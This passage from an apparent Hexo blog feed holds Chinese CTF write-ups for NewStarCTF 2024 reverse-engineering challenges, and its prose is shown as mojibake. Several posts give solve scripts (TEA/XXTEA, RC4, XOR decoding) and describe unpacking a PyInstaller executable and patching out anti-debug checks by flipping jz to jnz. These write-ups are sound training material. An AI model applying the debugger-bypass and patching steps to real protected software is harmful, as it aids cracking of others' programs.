class="hljs-number">129</span>];<br>    <span class="hljs-type">int</span> i,k = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">64</span>; i++)<br>    &#123;<br>        ascill[base64[i]] = k++;<br>    &#125;<br>    <span class="hljs-type">int</span> decodeStrlen = len / <span class="hljs-number">4</span> * <span class="hljs-number">3</span> + <span class="hljs-number">1</span>;<br>    <span class="hljs-type">char</span> *decodeStr= (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">char</span>) * decodeStrlen);<br>    k = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; len; i++)<br>    &#123;<br>        decodeStr[k++] = (ascill[str[i]] &lt;&lt; <span class="hljs-number">2</span>) | (ascill[str[++i]] &gt;&gt; <span class="hljs-number">4</span>);<br>        <span class="hljs-keyword">if</span> (str[i + <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;=&#x27;</span>)<br>        &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        decodeStr[k++] = (ascill[str[i]] &lt;&lt; <span class="hljs-number">4</span>) | (ascill[str[++i]] &gt;&gt; <span class="hljs-number">2</span>);<br>        <span class="hljs-keyword">if</span> (str[i + <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;=&#x27;</span>)<br>        &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        decodeStr[k++] = (ascill[str[i]] &lt;&lt; <span class="hljs-number">6</span>) | (ascill[str[++i]]);<br>    &#125;<br>    decodeStr[k] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    *in = decodeStr;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> secrets[<span class="hljs-number">6</span>] =<br>            &#123;<span class="hljs-comment">//secretsæ•°ç»„</span><br>                    <span class="hljs-number">6866935238662214623LL</span>,<br>                    <span class="hljs-number">3247821795433987330LL</span>,<br>                    <span class="hljs-number">-3346872833356453065LL</span>,<br>                    <span class="hljs-number">1628153154909259154LL</span>,<br>                    <span class="hljs-number">-346581578535637655LL</span>,<br>                    <span class="hljs-number">3322447116203995091LL</span><br>            &#125;;<br>    <span class="hljs-built_in">btea</span>((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)secrets, <span class="hljs-number">-12</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)<span class="hljs-string">&quot;meow~meow~tea~~~&quot;</span>);<br>    <span class="hljs-type">char</span> *flag;<br>    <span class="hljs-built_in">decodeBase64</span>((<span class="hljs-type">char</span> *)secrets, <span class="hljs-built_in">strlen</span>((<span class="hljs-type">char</span> *)secrets), &amp;flag);<br>    <span class="hljs-built_in">rc4</span>(<span class="hljs-string">&quot;rc4k4y&quot;</span>, (<span class="hljs-type">char</span> *)flag);<br>    <span class="hljs-built_in">puts</span>(flag);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¥½éš¾å¥½éš¾å¥½éš¾ (((((T__T)))))</p><h1 id="PangBai-è¿‡å®¶å®¶ï¼ˆ3ï¼‰"><a href="#PangBai-è¿‡å®¶å®¶ï¼ˆ3ï¼‰" class="headerlink" title="PangBai è¿‡å®¶å®¶ï¼ˆ3ï¼‰"></a>PangBai è¿‡å®¶å®¶ï¼ˆ3ï¼‰</h1><p>å‘ç°é™„ä»¶æ˜¯ä¸€ä¸ª python ç¼–è¯‘çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼ŒPyInstaller æ˜¯ä¸€ä¸ªèƒ½æŠŠ <code>.py</code> è„šæœ¬æ‰“åŒ…æˆ <code>.exe</code> çš„ python åº“ã€‚</p><p><img src="https://img.dkdun.cn/v1/2024/12/fd9150cdeb260c60.png"></p><p>ç»™å®ƒè§£åŒ…ï¼Œå¯ä»¥ä½¿ç”¨ pyinstaller Extractor è¿›è¡Œè§£åŒ…ã€‚å‰æï¼š1. ä½¿ç”¨ pyinstaller è¿›è¡Œæ‰“åŒ…ã€‚2. æœªåŠ å¯†</p><p>è§£åŒ…åæ–‡ä»¶æ”¾åœ¨ä»¥ exe åå­— +_extracted çš„æ–‡ä»¶å¤¹ä¸­</p><p><img src="https://img.dkdun.cn/v1/2024/12/0a2592d5412198ae.png"></p><p>æ‰¾åˆ°å’Œç¨‹åºåŒåçš„ <code>NotNormalExe.pyc</code> è¿™ä¸ªæ–‡ä»¶ï¼Œç”¨çš„ <a href="https://pylingual.io/">https://pylingual.io</a> åç¼–è¯‘å®ƒï¼Œåç¼–è¯‘ç»“æœå¦‚ä¸‹</p><p><img src="https://img.dkdun.cn/v1/2024/12/492a93c4478014b6.png"></p><p>å°±æ˜¯ä¸€ä¸ªç®€å•çš„å¼‚æˆ–ï¼Œé‡ç‚¹æ˜¯è¦è§£åŒ…åç¼–è¯‘å‡ºæ¥æºç </p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">enc = [<span class="hljs-number">40</span>, <span class="hljs-number">9</span>, <span class="hljs-number">22</span>, <span class="hljs-number">52</span>, <span class="hljs-number">15</span>, <span class="hljs-number">56</span>, <span class="hljs-number">66</span>, <span class="hljs-number">71</span>, <span class="hljs-number">111</span>, <span class="hljs-number">121</span>,<br>       <span class="hljs-number">90</span>, <span class="hljs-number">33</span>, <span class="hljs-number">18</span>, <span class="hljs-number">40</span>, <span class="hljs-number">3</span>, <span class="hljs-number">13</span>, <span class="hljs-number">80</span>, <span class="hljs-number">28</span>, <span class="hljs-number">65</span>, <span class="hljs-number">68</span>, <span class="hljs-number">83</span>,<br>       <span class="hljs-number">88</span>, <span class="hljs-number">34</span>, <span class="hljs-number">86</span>, <span class="hljs-number">5</span>, <span class="hljs-number">12</span>, <span class="hljs-number">35</span>, <span class="hljs-number">82</span>, <span class="hljs-number">67</span>, <span class="hljs-number">3</span>, <span class="hljs-number">17</span>, <span class="hljs-number">79</span><br>       ]<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>key = <span class="hljs-string">&#x27;NewStar2024&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>     enc[i] ^= <span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)])<br>     flag += <span class="hljs-built_in">chr</span>(enc[i])<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>åªå…³äº Reverse</category>
      
      <category>èµ›é¢˜å¤ç°</category>
      
      <category>NewStarCTF 2024</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NewStarCTF 2024 Week2</title>
    <link href="/2024/11/11/%E5%A4%8D%E7%8E%B02/"/>
    <url>/2024/11/11/%E5%A4%8D%E7%8E%B02/</url>
    
    <content type="html"><![CDATA[<p>æœ‰ Java ä»£ç å®¡è®¡ï¼Œå¥½éš¾ï¼ŒJava æˆ‘è®¨åŒä½ qwqï¼Œä½†æ˜¯æˆ‘è§‰å¾—è¿™äº›é¢˜å‡ºå¾—å¤ªå¥½å•¦ï¼Œå¤ç°å®Œå­¦åˆ°äº†å¾ˆå¤šï¼ï¼ï¼</p><span id="more"></span><h1 id="Pangbai-æ³°æ‹‰è®°ï¼ˆ1ï¼‰"><a href="#Pangbai-æ³°æ‹‰è®°ï¼ˆ1ï¼‰" class="headerlink" title="Pangbai æ³°æ‹‰è®°ï¼ˆ1ï¼‰"></a>Pangbai æ³°æ‹‰è®°ï¼ˆ1ï¼‰</h1><p>ida æ‰“å¼€åæ±‡ç¼–æŸ¥çœ‹ï¼Œ<code>flag</code> å’Œä¸€ä¸ª <code>key</code> å¼‚æˆ–</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  std::ostream *v0; <span class="hljs-comment">// rax</span><br>  std::ostream *v1; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+24h] [rbp+4h]</span><br><br>  <span class="hljs-built_in">j___CheckForDebuggerJustMyCode</span>(&amp;_6D<span class="hljs-number">15E8</span>DE_Pangbai____1__Pangbai____1__1_cpp);<br>  v0 = std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="hljs-type">char</span>&gt;&gt;(std::cout, <span class="hljs-string">&quot;Use your debugger to discover the hidden flag!&quot;</span>);<br>  std::ostream::<span class="hljs-keyword">operator</span>&lt;&lt;(v0, std::endl&lt;<span class="hljs-type">char</span>,std::char_traits&lt;<span class="hljs-type">char</span>&gt;&gt;);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; ++i )<br>    flag[i] ^= key[i];<br>  v1 = std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="hljs-type">char</span>&gt;&gt;(std::cout, <span class="hljs-string">&quot;Click on the flag to obtain?&quot;</span>);<br>  std::ostream::<span class="hljs-keyword">operator</span>&lt;&lt;(v1, std::endl&lt;<span class="hljs-type">char</span>,std::char_traits&lt;<span class="hljs-type">char</span>&gt;&gt;);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯¹ <code>key</code> äº¤å‰å¼•ç”¨èƒ½çœ‹è§è¿˜æ²¡ <code>main0</code> å‡½æ•°è°ƒç”¨ï¼Œè¿›å»çœ‹çœ‹</p><p><img src="https://img.dkdun.cn/v1/2024/12/15b058a1dd2841b6.png"></p><p>å‘ç°æœ‰ä¸¤ä¸ªå‡½æ•° <code>IsDebuggerPresent()</code> å’Œ <code>CheckRemoteDebuggerPresent()</code>ï¼Œè¿™æ˜¯ä¸¤ä¸ªåè°ƒè¯•å‡½æ•°</p><p><img src="https://img.dkdun.cn/v1/2024/12/2d0da2054ad0d700.png"></p><p>å¯¹äº <code>CheckRemoteDebuggerPresent()</code> å‡½æ•°ï¼š</p><p><code>kernel32</code> çš„ <code>CheckRemoteDebuggerPresent() </code>å‡½æ•°ç”¨äºæ£€æµ‹æŒ‡å®šè¿›ç¨‹æ˜¯å¦æ­£åœ¨è¢«è°ƒè¯•. <code>Remote</code> æŒ‡åŒä¸€ä¸ªæœºå™¨ä¸­çš„ä¸åŒè¿›ç¨‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">BOOL WINAPI CheckRemoteDebuggerPresent(<br>  _In_    HANDLE hProcess,<br>  _Inout_ PBOOL  pbDebuggerPresent<br>);<br></code></pre></td></tr></table></figure><p>å¦‚æœè¯´æ£€æµ‹åˆ°æ­£åœ¨è¢«è°ƒè¯•ï¼Œé‚£ä¹ˆ <code>pbDebuggerPresent</code> æŒ‡å‘çš„å€¼ä¼šè¢«è®¾ç½®ä¸º <code>0xffffffff</code>ã€‚</p><p>å¯¹äºè¿™é“é¢˜ï¼Œè°ƒè¯•ä¸€ä¸‹å¯ä»¥çœ‹å¾—å‡ºæ¥æµç¨‹ï¼Œè¿›ç¨‹ä¼šè·³è½¬åˆ°å³è¾¹è¿™é‡Œï¼Œè¿™é‡Œæ‰§è¡Œçš„æ˜¯å°† <code>key</code> æ›¿æ¢ä¸ºä¸æ­£ç¡®çš„ <code>key</code> ï¼Œæ‰€ä»¥å¯ä»¥å°† <code>jz</code> æŒ‡ä»¤æ”¹ä¸º <code>jnz</code> æŒ‡ä»¤ï¼Œè®©ç¨‹åºè·³è½¬ä¸äº†</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">jz: </span><span class="hljs-keyword">Jump </span>if <span class="hljs-built_in">Zero</span>,é›¶æ ‡å¿—ä½ ZF=<span class="hljs-number">1</span> æ—¶,<span class="hljs-keyword">jz </span>æŒ‡ä»¤æ‰§è¡Œè·³è½¬<br><span class="hljs-keyword">jnz: </span><span class="hljs-keyword">Jump </span>if Not <span class="hljs-built_in">Zero</span>,é›¶æ ‡å¿—ä½ ZF=<span class="hljs-number">0</span> æ—¶,<span class="hljs-keyword">jnz </span>æŒ‡ä»¤æ‰§è¡Œè·³è½¬<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2024/12/82229bdabbecb98c.png"></p><p>ç„¶åè¿›è¡Œè°ƒè¯•</p><p><img src="https://img.dkdun.cn/v1/2024/12/c57b3908876d84ca.png"></p><p>æå–æ•°æ®ï¼Œå†™è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">flag = [<span class="hljs-number">0x63</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x69</span>,<br>        <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x20</span>,<br>        <span class="hljs-number">0x79</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x6D</span>,<br>        <span class="hljs-number">0x65</span>, <span class="hljs-number">0x3F</span>]<br>key = [<span class="hljs-number">0x05</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x5A</span>,<br>       <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x59</span>,<br>       <span class="hljs-number">0x26</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x09</span>,<br>       <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x42</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>):<br>    flag[i] ^= key[i]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(flag[i]), end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><h1 id="drink-tea"><a href="#drink-tea" class="headerlink" title="drink_tea"></a>drink_tea</h1><p>å…ˆè¯»ä¸€éæµç¨‹ï¼Œè¾“å…¥é•¿åº¦ä¸º 32 çš„å­—ç¬¦ä¸²ï¼Œè¿›å…¥ <code>sub_140001180</code>ï¼Œç„¶åå†æ¯”è¾ƒ</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+20h] [rbp-28h]</span><br>  __int64 v5; <span class="hljs-comment">// [rsp+28h] [rbp-20h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please Input: \n&quot;</span>);<br>  <span class="hljs-built_in">sub_140001120</span>(<span class="hljs-string">&quot;%32s&quot;</span>, byte_140004700);<br>  v5 = <span class="hljs-number">-1</span>i64;<br>  <span class="hljs-keyword">do</span><br>    ++v5;<br>  <span class="hljs-keyword">while</span> ( byte_140004700[v5] );<br>  <span class="hljs-keyword">if</span> ( v5 == dword_140004078 )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; dword_140004078; i += <span class="hljs-number">8</span> )<br>      <span class="hljs-built_in">sub_140001180</span>(&amp;byte_140004700[i], aWelcometonewst);<br>    <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">memcmp</span>(byte_140004700, &amp;unk_140004080, dword_140004078) )<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Right! \n&quot;</span>);<br>    <span class="hljs-keyword">else</span><br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;wrong!&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Wrong! \n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿›å…¥ <code>sub_140001180</code> å‡½æ•°æŸ¥çœ‹</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">__int64</span> __fastcall sub_140001180(unsigned int *<span class="hljs-built_in">a1</span>, _DWORD *<span class="hljs-built_in">a2</span>)<br>&#123;<br>  __int64 result<span class="hljs-comment">; // rax</span><br>  unsigned int <span class="hljs-built_in">v3</span><span class="hljs-comment">; // [rsp+0h] [rbp-38h]</span><br>  unsigned int <span class="hljs-built_in">v4</span><span class="hljs-comment">; // [rsp+4h] [rbp-34h]</span><br>  int <span class="hljs-built_in">v5</span><span class="hljs-comment">; // [rsp+8h] [rbp-30h]</span><br>  unsigned int i<span class="hljs-comment">; // [rsp+Ch] [rbp-2Ch]</span><br><br>  <span class="hljs-built_in">v3</span> = *<span class="hljs-built_in">a1</span><span class="hljs-comment">;</span><br>  <span class="hljs-built_in">v4</span> = <span class="hljs-built_in">a1</span>[<span class="hljs-number">1</span>]<span class="hljs-comment">;</span><br>  <span class="hljs-built_in">v5</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span><br>  for ( i = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; 0x20; ++i )</span><br>  &#123;<br>    <span class="hljs-built_in">v5</span> -= <span class="hljs-number">1640531527</span><span class="hljs-comment">;</span><br>    <span class="hljs-built_in">v3</span> += (<span class="hljs-built_in">a2</span>[<span class="hljs-number">1</span>] + (<span class="hljs-built_in">v4</span> &gt;&gt; <span class="hljs-number">5</span>)) ^ (<span class="hljs-built_in">v5</span> + <span class="hljs-built_in">v4</span>) ^ (*<span class="hljs-built_in">a2</span> + <span class="hljs-number">16</span> * <span class="hljs-built_in">v4</span>)<span class="hljs-comment">;</span><br>    <span class="hljs-built_in">v4</span> += (<span class="hljs-built_in">a2</span>[<span class="hljs-number">3</span>] + (<span class="hljs-built_in">v3</span> &gt;&gt; <span class="hljs-number">5</span>)) ^ (<span class="hljs-built_in">v5</span> + <span class="hljs-built_in">v3</span>) ^ (<span class="hljs-built_in">a2</span>[<span class="hljs-number">2</span>] + <span class="hljs-number">16</span> * <span class="hljs-built_in">v3</span>)<span class="hljs-comment">;</span><br>  &#125;<br>  *<span class="hljs-built_in">a1</span> = <span class="hljs-built_in">v3</span><span class="hljs-comment">;</span><br>  result = <span class="hljs-number">4</span>i64<span class="hljs-comment">;</span><br>  <span class="hljs-built_in">a1</span>[<span class="hljs-number">1</span>] = <span class="hljs-built_in">v4</span><span class="hljs-comment">;</span><br>  return result<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>çœ‹åˆ°è¿™ä¸ªåŠ å¯†æµç¨‹å°±èƒ½å‘ç°æ˜¯ tea ç®—æ³•åŠ å¯†æ‰¾åˆ°<code>key</code> å’Œè¾“å…¥çš„å€¼ç›´æ¥é€†</p><p><img src="https://img.dkdun.cn/v1/2024/12/22dcddbe3c87348b.png"></p><p>è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">decrypt</span> <span class="hljs-params">(<span class="hljs-type">uint32_t</span>* v, <span class="hljs-type">uint32_t</span>* k)</span> &#123;<br>    <span class="hljs-type">uint32_t</span> v0=v[<span class="hljs-number">0</span>], v1=v[<span class="hljs-number">1</span>], sum=<span class="hljs-number">0xC6EF3720</span>, i;  <br>    <span class="hljs-type">uint32_t</span> delta=<span class="hljs-number">0x9e3779b9</span>;                     <br>    <span class="hljs-type">uint32_t</span> k0=k[<span class="hljs-number">0</span>], k1=k[<span class="hljs-number">1</span>], k2=k[<span class="hljs-number">2</span>], k3=k[<span class="hljs-number">3</span>];   <br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">32</span>; i++) &#123;                         <br>        v1 -= ((v0&lt;&lt;<span class="hljs-number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="hljs-number">5</span>) + k3);<br>        v0 -= ((v1&lt;&lt;<span class="hljs-number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="hljs-number">5</span>) + k1);<br>        sum -= delta;<br>    &#125;                                              <br>    v[<span class="hljs-number">0</span>]=v0; v[<span class="hljs-number">1</span>]=v1;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> i,j;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> flag[] = &#123;<span class="hljs-number">0x78</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x85</span>,<br><span class="hljs-number">0x59</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x07</span>, <br><span class="hljs-number">0xA8</span>,<span class="hljs-number">0xB9</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x24</span>&#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> keys[]=<span class="hljs-string">&quot;WelcomeToNewStar&quot;</span>;<br><br>    <span class="hljs-type">uint32_t</span> *v = (<span class="hljs-type">uint32_t</span>*)flag;<br>    <span class="hljs-type">uint32_t</span> *k = (<span class="hljs-type">uint32_t</span>*)keys;<br><br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">8</span>;i+=<span class="hljs-number">2</span>)&#123;<span class="hljs-comment">//æ¯8ä¸ªå­—èŠ‚(2ä¸ª uint32)è§£å¯†</span><br>        decrypt(v+i,k);<br>    &#125;<br>    <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">32</span>;j++)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,flag[j]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="ezencrypt"><a href="#ezencrypt" class="headerlink" title="ezencrypt"></a>ezencrypt</h1><p>å…ˆæŸ¥çœ‹ <code>MainActivity</code> å‡½æ•°å‘ç°æœ‰åŠ å¯†é€»è¾‘ï¼Œ<code>Enc enc = new Enc(tx)</code>ï¼Œé‚£å°±å» <code>Enc</code> å‡½æ•°çœ‹çœ‹</p><p><img src="https://img.dkdun.cn/v1/2024/12/2d292afff47f2193.png"></p><p><code>Enc</code> çš„æ„é€ å‡½æ•°é‡Œè¿›è¡Œç¬¬ä¸€æ¬¡åŠ å¯†ï¼Œ<code>ECB</code> æ¨¡å¼çš„ <code>AES</code> åŠ å¯†ï¼Œå¯†é’¥æ˜¯ <code>MainActivity</code> çš„ <code>title</code></p><p><code>doEncCheck</code> å‡½æ•°è¿›è¡ŒåŠ å¯†æ•°æ®æ£€æŸ¥ï¼Œå‘ç°æœ‰ <code>native</code> å…³é”®å­—ï¼Œåœ¨ Java ä¸­ï¼Œ<code>native </code>å…³é”®å­—ç”¨äºå£°æ˜ä¸€ä¸ªæ–¹æ³•æ˜¯ç”±æœ¬åœ°ä»£ç ï¼ˆé€šå¸¸æ˜¯Cæˆ–C++ï¼‰å®ç°çš„ï¼Œæ‰€ä»¥è¯´æ˜å‡½æ•°æ˜¯ C&#x2F;C++ ç¼–å†™çš„ï¼Œæ‰€ä»¥ä¸»ä½“åœ¨ so æ–‡ä»¶ï¼Œè¿›è¡Œ so æå–</p><p><img src="https://img.dkdun.cn/v1/2024/12/f133efd830a5c77f.png"></p><p>IDA æ‰“å¼€ so æ–‡ä»¶ï¼Œæ‰¾åˆ° <code>doEncCheck</code> ï¼Œç‚¹è¿›å»æŸ¥çœ‹</p><p><img 